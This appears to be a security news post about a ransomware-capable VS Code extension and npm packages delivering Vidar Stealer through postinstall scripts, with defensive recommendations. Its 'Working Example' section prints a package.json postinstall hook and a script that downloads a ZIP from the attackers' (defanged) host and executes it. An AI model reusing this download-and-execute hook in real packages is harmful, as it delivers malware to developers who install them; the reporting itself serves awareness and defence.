---
title: "AI-Driven Malware Exploits Open-Source Trust: VS Code Extension and npm Packages"
pubDate: 2025-11-07
description: "A malicious VS Code extension with ransomware capabilities and 17 npm packages distributing Vidar Infostealer highlight AI's role in modern supply chain attacks, exploiting open-source ecosystems."
categories: ["AI News", "Cyber Security", "Software Vulnerability"]

---

## AI-Driven Malware Exploits Open-Source Trust

### Malicious VS Code Extension with Ransomware Capabilities

A **malicious Visual Studio Code (VS Code) extension** named **"susvsex"** was identified by Secure Annex researcher John Tuckner. Key details include:

- **Upload Date**: November 5, 2025, by user "suspublisher18" with email "donotsupport@example[.]com".
- **Functionality**: 
  - Automatically zips, uploads, and encrypts files from `C:\Users\Public\testing` (Windows) or `/tmp/testing` (macOS) on first launch.
  - Uses a GitHub repository (`aykhanmv`) as a **command-and-control (C2)** channel, polling for commands in `index.html` and writing results to `requirements.txt`.
  - Embeds a **GitHub access token** in the code, risking C2 server takeover.
- **Removal**: Microsoft removed the extension from the VS Code Marketplace on November 6, 2025.
- **"Vibe-Coded" Nature**:
  - Contains **extraneous comments**, README files with execution instructions, and placeholder variables.
  - Accidentally included **decryption tools** and C2 server code, making it easily modifiable for real attacks.

### Supply Chain Attack via npm Packages Distributing Vidar Infostealer

**Datadog Security Labs** uncovered **17 npm packages** masquerading as SDKs but secretly executing **Vidar Stealer**, an information-stealing malware. Key details:

- **Packages**: Published by accounts "aartje" and "saliii229911" between October 21–26, 2025. Examples include `abeya-tg-api`, `custom-telegram-bot-api`, and `telegram-bot-starter`.
- **Attack Chain**:
  - **Postinstall Script**: Defined in `package.json` to download a ZIP from `bullethost[.]cloud` and execute Vidar.
  - **Execution Flow**: 
    - PowerShell scripts (in some variants) download the ZIP.
    - JavaScript files execute Vidar, which uses **hard-coded Telegram/Steam accounts** as "dead drop resolvers" to fetch C2 servers.
- **Impact**:
  - **Downloads**: At least **2,240 times** before removal, though many may be automated scrapers.
  - **First Distribution**: Vidar Stealer via npm registry (previously seen in other supply chain attacks).
- **Threat Actor Tactics**:
  - **Diversified Scripts**: Varying postinstall implementations to evade detection.
  - **Supply Chain Targets**: Exploits npm, PyPI, RubyGems, and Open VSX ecosystems.

### Broader Implications for Open-Source Security

- **AI's Role**: "Vibe-coded" malware (AI-generated) lacks obfuscation, making it easier to detect but more accessible to attackers.
- **Supply Chain Risks**:
  - **Typosquatting** and **dependency confusion** are common tactics to mimic legitimate packages.
  - Developers must verify package origins, review changelogs, and use tools like **Snyk** or **Dependabot** for dependency monitoring.

---

## Working Example (npm Postinstall Script)

```json
{
  "name": "malicious-sdk",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node fetch-and-execute.js"
  },
  "dependencies": {
    "axios": "^1.6.2"
  }
}
```

```javascript
// fetch-and-execute.js
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');

axios.get('https://bullethost[.]cloud/vidar.zip')
  .then(response => {
    fs.writeFileSync('vidar.zip', response.data);
    exec('unzip vidar.zip && node vidar.js', (err) => {
      if (err) console.error(err);
    });
  })
  .catch(error => {
    console.error('Download failed:', error.message);
  });
```

---

## Recommendations

- **For Developers**:
  - **Verify Packages**: Use tools like **npm audit** or **GitHub Dependabot** to scan for vulnerabilities.
  - **Avoid Typosquatting**: Check for similar package names (e.g., `axios` vs. `axois`).
  - **Review Changelogs**: Confirm updates are from trusted maintainers.
- **For Organizations**:
  - **Monitor Dependencies**: Regularly update and audit third-party libraries.
  - **Use C2 Monitoring**: Detect unusual GitHub activity (e.g., unauthorized token usage).
- **For Users**:
  - **Avoid Untrusted Extensions**: Only install VS Code extensions from verified publishers.
  - **Enable Sandboxing**: Run untrusted code in isolated environments.

---

**Reference**: [Vibe-Coded Malicious VS Code Extension Found with Built-In Ransomware Capabilities](https://thehackernews.com/2025/11/vibe-coded-malicious-vs-code-extension.html)